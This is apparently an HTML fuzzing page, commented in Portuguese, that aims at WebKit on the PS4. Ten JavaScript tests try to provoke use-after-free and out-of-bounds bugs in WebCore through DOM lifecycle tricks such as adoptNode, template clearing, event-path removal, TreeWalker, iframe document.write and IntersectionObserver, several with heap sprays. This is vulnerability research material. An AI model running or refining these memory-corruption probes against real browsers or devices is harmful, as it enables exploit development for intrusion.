
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit Fuzzing - Vetores DOM Isolados</title>
</head>
<body>
    <h1>Testes de Corrupção WebCore - Lote 4</h1>
    <div id="log-container"></div>

    <script>
        function logMsg(msg) {
            console.log(msg);
            let p = document.createElement("p");
            p.innerText = msg;
            document.getElementById("log-container").appendChild(p);
        }

        // Teste 16: Adoção Cruzada de Nós (Cross-Document AdoptNode UAF)
        // Cria um documento virtual em memória, extrai um nó dele e destrói o documento origem.
        // O WebCore pode falhar ao atualizar os ponteiros de contexto (Document pointer) do nó órfão.
        function test16() {
            logMsg("Iniciando Teste 16 (Cross-Document AdoptNode)...");
            try {
                let doc = document.implementation.createHTMLDocument("fuzz_doc");
                let orphanNode = doc.createElement("div");
                doc.body.appendChild(orphanNode);
                
                // Quebra a referência do documento original para forçar a coleta
                doc = null; 
                
                // Força um spray rápido para ocupar a memória do documento destruído
                let spray = new Array(1000).fill(new ArrayBuffer(128));
                
                // Tenta adotar o nó cujo documento pai "não existe" mais
                document.body.appendChild(document.adoptNode(orphanNode));
            } catch(e) {}
            logMsg("Fim do Teste 16.");
        }

        // Teste 17: Corrupção de Fragmento via HTMLTemplateElement
        // A tag <template> armazena nós em um DocumentFragment isolado no C++.
        // Esvaziar o template enquanto manipulamos um filho direto pode vazar a referência.
        function test17() {
            logMsg("Iniciando Teste 17 (Template Fragment UAF)...");
            try {
                let tpl = document.createElement("template");
                let frag = tpl.content; // Aponta para o DocumentFragment interno
                let span = document.createElement("span");
                frag.appendChild(span);
                
                // Oblítera o conteúdo do template via parser HTML interno
                tpl.innerHTML = "";
                
                // Tenta interagir com o filho que estava atrelado ao fragmento destruído
                span.appendChild(document.createElement("b"));
            } catch(e) {}
            logMsg("Fim do Teste 17.");
        }

        // Teste 18: Quebra de Iterador em Validação Síncrona de Formulário
        // O WebCore usa um iterador nativo para varrer os elementos do form durante o checkValidity().
        // Remover um elemento vizinho durante esse loop síncrono causa desvio de ponteiro.
        function test18() {
            logMsg("Iniciando Teste 18 (Form Validation Iterator Race)...");
            try {
                let form = document.createElement("form");
                let input1 = document.createElement("input");
                let input2 = document.createElement("input");
                input1.required = true;
                input2.required = true;
                
                form.appendChild(input1);
                form.appendChild(input2);
                document.body.appendChild(form);

                // Quando o C++ estiver validando o input1, nós destruímos o input2 da memória
                input1.addEventListener("invalid", () => {
                    input2.remove();
                });
                
                // Dispara o loop em C++
                form.checkValidity();
            } catch(e) {}
            logMsg("Fim do Teste 18.");
        }

        // Teste 19: Vetor de Propagação de Eventos (Event Path UAF)
        // Quando um evento é disparado, o WebCore cria um array nativo (Event Path) com os nós.
        // Destruir o nó alvo de dentro do seu próprio manipulador corrompe esse vetor.
        function test19() {
            logMsg("Iniciando Teste 19 (Event Path Propagation UAF)...");
            try {
                let btn = document.createElement("button");
                document.body.appendChild(btn);
                
                btn.addEventListener("fuzzEvent", (e) => {
                    // Remove o nó da árvore DOM
                    btn.remove();
                    
                    // Tenta acessar o caminho do evento, que agora contém um ponteiro liberado
                    let path = e.composedPath(); 
                });
                
                // Despacha um evento customizado borbulhante
                btn.dispatchEvent(new Event("fuzzEvent", {composed: true, bubbles: true}));
            } catch(e) {}
            logMsg("Fim do Teste 19.");
        }

        // Teste 20: SVG foreignObject Tree Mutation
        // Elementos foreignObject permitem injetar HTML normal dentro do pipeline rigoroso do SVG.
        // Remover a raiz SVG enquanto se manipula o nó HTML interno causa anomalias de layout.
        function test20() {
            logMsg("Iniciando Teste 20 (SVG foreignObject Mutation)...");
            try {
                let svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
                let foreign = document.createElementNS("http://www.w3.org/2000/svg", "foreignObject");
                let div = document.createElement("div");
                
                foreign.appendChild(div);
                svg.appendChild(foreign);
                document.body.appendChild(svg);
                
                // Remove o contêiner SVG inteiro
                svg.remove();
                
                // Força o motor a recalcular o layout do nó HTML que estava no contexto SVG
                div.innerHTML = "<b>trigger layout</b>";
                let forceLayout = div.offsetHeight; 
            } catch(e) {}
            logMsg("Fim do Teste 20.");
        }

        
    

        // Teste 21: TreeWalker e Deleção do Nó Atual
        // O TreeWalker mantém um ponteiro interno nativo (C++) para o nó atual.
        // Mudar a estrutura da árvore e remover o nó atual antes do próximo passo pode causar OOB ou UAF.
        function test21() {
            logMsg("Iniciando Teste 21 (TreeWalker UAF)...");
            try {
                let div = document.createElement("div");
                let span = document.createElement("span");
                div.appendChild(span);
                
                let walker = document.createTreeWalker(div, NodeFilter.SHOW_ELEMENT);
                walker.currentNode = span;
                
                // Removemos o nó atual da árvore em que o Walker está iterando
                span.remove();
                
                // Tenta forçar o motor do WebCore a calcular o próximo nó a partir do limbo
                walker.nextNode(); 
            } catch(e) {}
            logMsg("Fim do Teste 21.");
        }

        // Teste 22: TextTrack (Media) Lifecycle
        // Elementos de mídia têm subsistemas internos que não dependem de WebAudio.
        // A faixa de legenda (TextTrack) e suas Cues gerenciam memória assíncrona.
        function test22() {
            logMsg("Iniciando Teste 22 (TextTrack Cue UAF)...");
            try {
                let video = document.createElement("video");
                let track = video.addTextTrack("subtitles", "Fuzz", "en");
                
                // VTTCue está disponível no WebKit padrão e injeta blocos no backend
                let cue = new VTTCue(0, 1, "fuzz test");
                track.addCue(cue);
                
                // Desanexa o vídeo inteiro, limpando seus componentes na memória
                video = null;
                
                // O track ainda possui uma referência no JavaScript, tentamos manipular
                // um cue de um componente que deveria ter sido destruído.
                track.removeCue(cue);
            } catch(e) {}
            logMsg("Fim do Teste 22.");
        }

        // Teste 23: Reestruturação Síncrona de Tabelas HTML
        // As tabelas possuem métodos injetados diretamente em C++ (insertRow, deleteRow).
        // Acelerar a exclusão de seções enquanto se manipula as linhas gera desvios de ponteiro.
        function test23() {
            logMsg("Iniciando Teste 23 (Table Section OOB)...");
            try {
                let table = document.createElement("table");
                let tbody = table.createTBody();
                let row = tbody.insertRow(0);
                row.insertCell(0);
                
                // Destrói o corpo da tabela, mas a linha ainda tem referência do JS
                tbody.remove();
                
                // Força o WebCore a acessar a árvore da tabela agora corrompida
                table.insertRow(0);
                row.innerHTML = "<td>órfão</td>";
            } catch(e) {}
            logMsg("Fim do Teste 23.");
        }

        // Teste 24: Iframe Document Overwrite (Dangling Pointer)
        // Usar document.write() em um iframe limpa completamente sua árvore DOM subjacente.
        // Reter referências do nó antigo (como o body) e tentar escrever nelas causa colapso na memória.
        function test24() {
            logMsg("Iniciando Teste 24 (Iframe Document Overwrite)...");
            try {
                let frame = document.createElement("iframe");
                document.body.appendChild(frame);
                
                let doc = frame.contentDocument;
                let bodyRef = doc.body; // Guarda o ponteiro do corpo original
                
                // Overwrite destrói a árvore C++ subjacente vinculada ao documento
                doc.write("<h1>Nova Árvore</h1>");
                doc.close();
                
                // Spray rápido para sobrepor a memória que o corpo antigo ocupava
                let spray = [];
                for(let i=0; i<500; i++) spray.push(new ArrayBuffer(256));
                
                // Tenta injetar nós na referência órfã
                bodyRef.appendChild(document.createElement("div"));
            } catch(e) {}
            logMsg("Fim do Teste 24.");
        }

        // Teste 25: IntersectionObserver em Nó Desconectado
        // Observadores dependem de cálculos visuais e de layout profundos.
        // Forçar a extração síncrona de registros de um nó recém destruído e coletado pelo GC.
        function test25() {
            logMsg("Iniciando Teste 25 (IntersectionObserver GC)...");
            try {
                let target = document.createElement("div");
                document.body.appendChild(target);
                
                let observer = new IntersectionObserver(() => {});
                observer.observe(target);
                
                // Desconecta o elemento
                target.remove();
                target = null;
                
                // Spray massivo de strings para pressionar o Coletor de Lixo do interpretador LLInt
                let spray = new Array(15000).fill("A".repeat(1024));
                
                // Força o motor C++ a processar a lista de nós alvo que podem já ter sido liberados
                observer.takeRecords();
                observer.disconnect();
            } catch(e) {}
            logMsg("Fim do Teste 25.");
        }

        

    </script>
</body>
</html>
